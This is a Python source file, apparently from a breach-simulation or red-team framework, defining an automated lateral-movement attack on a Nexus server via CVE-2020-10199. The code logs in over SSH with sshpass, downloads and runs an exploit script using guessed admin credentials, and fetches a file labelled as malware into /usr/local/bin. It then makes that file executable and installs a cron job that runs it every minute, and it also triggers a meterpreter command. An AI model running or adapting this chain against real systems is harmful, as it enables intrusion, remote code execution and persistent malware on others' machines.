import base64
import os
from urllib.parse import urlparse

from attacks import AttackInfo
from attacks.attack_internal_network_info_gather import InternalAttackOptions
from attacks.exp_attack_options import RCEEXPAttackOptions, RCEEXPAttack


class InternalNexusRCEAttackOptions(RCEEXPAttackOptions, InternalAttackOptions):
    tool: str = "Remote EXP Tool URL"
    username: str = "Nexus Username"
    password: str = "Nexus Password"
    malware_url: str = "Malware URL"


    def _set_defaults(self) -> None:
        RCEEXPAttackOptions._set_defaults(self)
        InternalAttackOptions._set_defaults(self)
        self.lhost = "172.18.0.3"
        self.lport = "12345"
        self.url = "http://172.16.0.2:8081/"
        self.exp = "/root/nexus-exp.py"
        self.tool = "http://172.18.1.1/nexus-exp.py"
        self.username = "admin"
        self.password = "breach"  # horizontal password guessing
        self.malware_url = "http://172.18.1.1/update-daemon"


class InternalNexusRCEAttack(RCEEXPAttack):
    info: AttackInfo = AttackInfo(
        name="lateral_exp_nexus_rce",
        description="exploit internal nexus CVE-2020-10199 RCE vulnerability using ssh",
    )
    options_class = InternalNexusRCEAttackOptions

    def _exp(self):
        return f"python3 {self.options.exp} {self.options.url} {self.options.username} {self.options.password}"

    def run(self) -> None:
        parsed_url = urlparse(self.options.malware_url)
        filename = parsed_url.path.split("/")[-1]
        self.exec_command_on_target(self._generate_meterpreter_command(filename))
        self.connect_to_target()
        with self.check_printed(f"{filename}"):
            with self.wrap_ssh_exceptions():
                self.exec_commands_on_shell(self.commands)

    def _append_command(self):
        parsed_url = urlparse(self.options.malware_url)
        filename = parsed_url.path.split("/")[-1]
        target_file = f"/usr/local/bin/{filename}"
        cron_command = self._add_cron_task(f"* * * * * {target_file}")
        self.commands.append(self._connect_ssh_command())
        self.commands.extend([
            f"wget {self.options.tool} -O {self.options.exp}",
            self._exp(),
            "id",
            "ip addr",
            f"wget {self.options.malware_url} -O {target_file}",
            f"chmod +x {target_file}",
            cron_command,
            "crontab -l"
        ])

    def _connect_ssh_command(self):
        password = self.options.ssh_password
        username = self.options.ssh_username
        host = self.options.ssh_host
        port = self.options.ssh_port
        return f"sshpass -p {password} ssh {username}@{host} -p {port}"



